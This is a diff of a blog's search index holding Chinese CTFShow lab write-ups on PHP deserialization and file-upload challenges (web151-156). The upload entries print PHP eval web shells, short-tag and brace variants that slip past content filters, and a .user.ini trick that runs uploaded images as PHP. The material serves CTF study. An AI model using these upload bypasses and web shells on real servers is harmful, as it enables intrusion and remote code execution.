@@ -1,50 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTFShow-文件上传</title>
-    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
-<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
-<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
-<p>蚁剑连接。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
-<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
-<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
-<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
-<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
-<p>当前目录没有，再试试上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
-<p>还是在上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
-<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
-<p>仍然一样的页面</p>
-<p>继续web152的套路试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
-<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
-<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
-<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>再上传 yjh.png木马</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
-<p>访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CTFShow-反序列化</title>
     <url>/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="CTFShow-反序列化"><a href="#CTFShow-反序列化" class="headerlink" title="CTFShow 反序列化"></a>CTFShow 反序列化</h1><span id="more"></span>
@@ -205,7 +161,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/[oc]:\d+:/i&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>意思是字母: o:1: 或者 c:1: 才能被匹配，数字1可以替换为其他数字，字母o和c二选一。</p>
+<li><p>意思是字母: o:1: 或者 c:1: 才能被匹配，数字1可以替换为其他数字，字母o和c二选一。o 是objiect,序列化后的格式。</p>
 </li>
 <li><p>匹配到了为 true 再执行 ! 为 false， false了就不能执行 if() 中的语句。</p>
 </li>
@@ -226,6 +182,103 @@
 <li>上 bp</li>
 </ul>
 <p><img src="/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/web258_1.png"></p>
+<h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: vip in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">6</span></span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught <span class="built_in">Error</span>: Call to a member <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>) <span class="title">on</span> <span class="title">bool</span> <span class="title">in</span> /<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">index</span>.<span class="title">php</span>:8 <span class="title">Stack</span> <span class="title">trace</span>: #0 </span>&#123;main&#125; thrown in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>不会。</li>
+</ul>
+<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CTFShow-文件上传</title>
+    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
+<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
+<p>蚁剑连接。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
+<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
+<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
+<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
+<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
+<p>当前目录没有，再试试上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
+<p>还是在上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
+<p>仍然一样的页面</p>
+<p>继续web152的套路试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
+<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
+<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
+<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>再上传 yjh.png木马</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
+<p>访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
+<p>仍然一样的页面</p>
+<p>注意和前面一样需要上传  .user.ini 文件才能将 png解析为 php 文件。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>上传一个图片马 yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
+<p>页面显示：文件上传失败，失败原因：文件内容不合规。</p>
+<p>那么可能对文件内容做了过滤，试试PHP短标签，php有很多短标签但是只有 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这种形式的使用不受PHP配置的限制，其它几种形式需要PHP开启什么什么才能，不作展示，记不到了。我建议以后直接写这种短标签的形式。</p>
+<p>修改 yjh.png 的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时修改后的上传成功，并成功返回上传路径。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
+<p>哦豁，文件内心不合规，看来又是对什么字符进行了过滤。试试之后发现 把 中括号 [] 给干没了，换成大括号 {}</p>
+<p>yjh.png</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
